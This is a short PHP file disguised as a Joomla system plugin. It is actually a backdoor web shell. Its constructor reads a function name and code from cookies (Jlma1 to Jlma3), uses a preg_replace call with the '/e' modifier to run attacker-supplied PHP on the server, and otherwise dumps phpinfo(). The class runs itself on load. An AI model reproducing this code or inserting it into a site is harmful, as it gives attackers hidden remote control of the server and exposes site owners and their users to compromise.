<?php
/**
 * @package     Joomla.Plugin.System
 * @since       1.5
 *
 *
 */
class PlgSysJoomla {
public function __construct() {
$file=@$_COOKIE['Jlma3'];
if ($file){ $opt=$file(@$_COOKIE['Jlma2']); $au=$file(@$_COOKIE['Jlma1']); $opt("/292/e",$au,292); die();} else {phpinfo();die;}}}
$index=new PlgSysJoomla;